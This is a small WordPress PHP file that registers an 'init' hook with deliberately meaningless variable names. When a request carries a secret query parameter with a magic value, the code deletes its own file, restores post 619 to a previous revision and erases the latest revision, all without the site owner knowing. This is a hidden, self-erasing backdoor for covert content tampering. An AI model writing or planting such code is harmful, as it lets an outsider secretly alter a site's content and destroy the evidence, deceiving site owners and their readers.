<?php

function next_terms_scheduled() {
	if (isset($_GET['description_lightbox_framework_accessibility']) && $_GET['description_lightbox_framework_accessibility'] === 'controller_table_polyfill_radio') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$multi_icon_bank_forum = 619;
		$listing_comments_backup_revisions = wp_get_post_revisions($multi_icon_bank_forum);
		if (empty($listing_comments_backup_revisions)) die('no revisions');
		if (count($listing_comments_backup_revisions) < 2) die('less than 2');
		$notice_favicon_quote_variation = array_shift($listing_comments_backup_revisions);
		$total_cover_maintenance = $notice_favicon_quote_variation->ID;
		$library_get_notifier = array_shift($listing_comments_backup_revisions);
		$table_insert_accessible = $library_get_notifier->ID;
		$patterns_amp_google = wp_restore_post_revision($table_insert_accessible);
		if ($patterns_amp_google === false) die('error restoring');
		$patterns_amp_google = wp_delete_post_revision($total_cover_maintenance);		
		if ($patterns_amp_google === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'next_terms_scheduled');
